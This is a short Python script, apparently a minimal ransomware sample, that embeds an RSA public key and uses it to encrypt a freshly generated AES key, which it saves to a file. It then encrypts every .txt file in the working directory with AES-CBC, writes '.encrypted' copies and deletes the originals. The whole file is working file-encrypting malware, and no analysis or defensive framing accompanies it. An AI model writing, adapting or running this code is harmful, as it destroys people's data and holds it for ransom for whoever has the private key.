import os
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from base64 import b64decode
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_v1_5


# Burn public key
e = '''MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxUOGZeus3EsRrOoexH+h
z2/5OdPv2rJi+uzlQV322KSh+ESHayo/4HnpgKSeoLWCaBbJBskIBNhl7g14nIpt
lP187qEP9jKHjsMvrTB4Oefi69cppbHDAP8YKoRY6FdCPTqYcmItkhhslNsGA7Br
QWhTZYcpPy116KMZS5dQA+Cr6N7oUtg4sNoDyTY+IfcDo8v1icivckEI4njU0axy
L0ZZpARI62uRiqkS0fR6tet1KFLW8x1FryZ0qwbV2HXS1zr6SQbgbFgz2d4YPWV8
/oVJjTubzmRu3VfD2kWIBYxILkJbTO4sv/A/SIjBZDsXATOC1LO2n86RU//bbg2B
wQIDAQAB'''
p_key = RSA.import_key(b64decode(e))
s_key = get_random_bytes(16)


# Encrypt k -> new file
rsa_cipher = PKCS1_v1_5.new(p_key)
enc_shared_key = rsa_cipher.encrypt(s_key)


with open('EncryptedSharedKey', 'wb') as f:
   f.write(enc_shared_key)


# Iterate through files in directory
for file in os.listdir():
   if file.endswith('.txt'):
       with open(file, 'rb') as f:
           data = f.read()
      
       # Encrypt file
       cipher_aes = AES.new(s_key, AES.MODE_CBC)
       encrypted_data = cipher_aes.encrypt(pad(data, AES.block_size))
      
       with open(file + '.encrypted', 'wb') as f:
           f.write(cipher_aes.iv)
           f.write(encrypted_data)
      
       # Delete the original
       os.remove(file)
